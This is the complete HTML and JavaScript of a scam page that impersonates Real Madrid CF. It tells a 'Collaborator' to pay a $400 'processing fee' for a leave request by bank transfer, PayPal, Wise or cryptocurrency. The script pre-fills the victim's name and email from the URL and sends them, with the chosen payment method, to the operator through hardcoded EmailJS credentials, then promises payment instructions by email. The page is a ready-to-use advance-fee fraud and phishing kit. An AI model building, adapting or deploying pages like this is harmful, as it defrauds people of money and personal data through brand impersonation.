<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Complete Registration â€“ Real Madrid CF</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 40px 15px;
    }
    .container {
      max-width: 600px;
      background: white;
      padding: 40px;
      margin: auto;
      border-radius: 14px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
      text-align: center;
    }
    .logo {
      width: 90px;
      margin-bottom: 25px;
    }
    h2 {
      margin: 10px 0 20px;
      font-size: 24px;
    }
    p {
      color: #333;
      font-size: 16px;
    }
    .payment-options {
      margin-top: 30px;
    }
    .payment-options button {
      width: 100%;
      background: #ffffff;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 14px 20px;
      font-size: 16px;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin: 10px 0;
      cursor: pointer;
      transition: all 0.2s ease;
    }
    .payment-options button:hover {
      background: #f0f0f0;
    }
    .payment-options img {
      width: 28px;
      margin-right: 14px;
    }
    .thank-you {
      display: none;
      margin-top: 30px;
      padding: 20px;
      border-radius: 10px;
      background: #e9fbe9;
      color: #2e662e;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://i.imgur.com/y4DFFMe.png" class="logo" alt="Real Madrid Logo" />
    
    <h2>Complete Your Application</h2>
    <p id="welcome-message">Welcome, <span id="displayName">Collaborator</span>. To Complete your application for leave request, please select your preferred payment method below to send $400 processing fee.</p>

    <form id="paymentForm">
      <!-- Hidden dynamic fields -->
      <input type="hidden" name="full_name" id="full_name" value="" />
      <input type="hidden" name="email" id="email" value="" />
      <input type="hidden" name="payment_method" id="payment_method" value="" />

      <div class="payment-options">
        <button type="button" onclick="submitPayment('Bank Transfer')">
          <img src="https://cdn-icons-png.flaticon.com/512/1006/1006555.png" alt="Bank" /> Bank Transfer
        </button>
        <button type="button" onclick="submitPayment('PayPal')">
          <img src="https://cdn-icons-png.flaticon.com/512/888/888870.png" alt="PayPal" /> PayPal
        </button>
        <button type="button" onclick="submitPayment('Wise')">
          <img src="https://seeklogo.com/images/W/wise-logo-5364E252C6-seeklogo.com.png" alt="Wise" /> Wise (TransferWise)
        </button>
        <button type="button" onclick="submitPayment('Cryptocurrency')">
          <img src="https://cdn-icons-png.flaticon.com/512/825/825500.png" alt="Crypto" /> Cryptocurrency
        </button>
      </div>
    </form>

    <div class="thank-you" id="thankYouMessage"></div>
  </div>

  <script>
    (function(){
      emailjs.init("JWcOE8k4MMUEFNPy-");

      // Optional: Pre-fill from query string like ?name=Francois&email=francois@example.com
      const urlParams = new URLSearchParams(window.location.search);
      const name = urlParams.get('name') || 'Collaborator';
      const email = urlParams.get('email') || '';

      document.getElementById('displayName').textContent = name;
      document.getElementById('full_name').value = name;
      document.getElementById('email').value = email;
    })();

    function submitPayment(method) {
      document.getElementById("payment_method").value = method;

      emailjs.send("service_96jc01n", "template_uikbtgh", {
        full_name: document.getElementById("full_name").value,
        email: document.getElementById("email").value,
        payment_method: method
      })
      .then(() => {
        document.querySelector(".payment-options").style.display = "none";
        document.getElementById("thankYouMessage").style.display = "block";
        document.getElementById("thankYouMessage").innerText = 
          `Thank you. Payment instructions for ${method} will be sent to your registered email shortly.`;
      })
      .catch((error) => {
        alert("Failed to send. Please try again later.");
        console.error("EmailJS Error:", error);
      });
    }
  </script>
</body>
</html>
